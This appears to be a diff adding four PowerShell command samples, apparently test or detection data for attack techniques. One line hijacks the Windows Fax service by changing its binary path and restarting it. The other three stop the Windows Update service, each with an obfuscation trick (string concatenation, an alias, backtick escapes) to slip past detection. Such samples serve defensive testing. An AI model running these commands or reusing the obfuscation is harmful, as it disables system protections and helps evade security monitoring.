@@ -1,0 +1,4 @@
+"powershell.exe" & {Stop-Service -Name \""fax\"" -force -erroraction silentlycontinue | Out-Null set-servicebinarypath -name \""fax\"" -path \""$env:windir\system32\notepad.exe\"" start-service -Name \""fax\"" -erroraction silentlycontinue | out-null}
+powershell.exe -Command "&('Stop'+'-Service') wuauserv"
+powershell.exe -Command "spsv wuauserv"
+powershell.exe -Command "St`op-Ser`vi`ce wuauserv"
